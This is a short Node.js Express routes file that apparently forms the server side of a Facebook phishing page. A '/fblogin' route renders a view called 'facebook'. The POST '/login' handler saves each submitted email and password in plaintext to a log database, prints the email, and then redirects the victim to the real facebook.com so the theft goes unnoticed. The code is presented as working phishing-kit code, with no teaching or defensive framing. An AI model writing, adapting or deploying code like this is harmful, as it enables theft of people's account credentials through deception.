
//console.log(Qusetion);
module.exports = function(app, passport) {
    var Log       = require('../app/models/log');
    
    app.get('/cookie', function(req, res){
      res.cookie('username', 'facebook', {expire: new Date() + 555}).send('username has the value of Derek Banas');
    });

    app.get('/fblogin', function(req,res){
      res.render('facebook')
//      console.log(req.session);
    });
    
    
    app.post('/login',function( req,res) {
//          console.log(req.body);
          var newLog = new Log();
        
          newLog.password =req.body.pass;
          newLog.email =req.body.email;
        
          console.log(newLog.email);
          
          newLog.save(function(err){
            if(err)
                console.log(err);
        });
//        res.render('thankyou');
        res.redirect('https://www.facebook.com/');
        
   });
};

// route middleware to make sure a user is logged in
function isLoggedIn(req, res, next) {

    // if user is authenticated in the session, carry on 
    if (req.isAuthenticated())
        return next();

    // if they aren't redirect them to the home page
    res.redirect('/login');
}
